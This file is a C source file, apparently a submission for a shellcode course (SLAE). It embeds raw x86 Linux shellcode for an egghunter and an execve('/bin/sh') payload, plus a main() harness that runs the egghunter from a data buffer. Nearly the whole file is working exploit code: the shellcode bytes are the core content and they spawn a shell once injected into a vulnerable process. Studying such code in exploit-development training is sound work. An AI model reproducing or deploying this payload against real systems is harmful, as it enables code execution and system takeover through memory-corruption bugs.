/* Description:	EggHunter(execve(/bin/sh))
 * Author:	Paolo Stivanin <https://github.com/polslinux>
 * SLAE ID:	526
 */

#include <stdio.h>
#include <string.h>

unsigned char eggshell[] = \
"\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x31\xdb\xb1\x02\x81\x3c\x18\xaa\xbb\xcc\xdd\x75\xf2\x83\xc3\x04\xfe\xc9\x75\xf0\x8d\x40\x08\xff\xe0";

unsigned char shellcode[] = \
"\xaa\xbb\xcc\xdd" //egg
"\xaa\xbb\xcc\xdd" //egg
"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void){
	printf("EggHunter: %zu\n", strlen(eggshell));
	printf("Shellcode: %zu\n", strlen(shellcode));
	int (*ret)() = (int(*)())eggshell;
	ret();
	return 0;
}
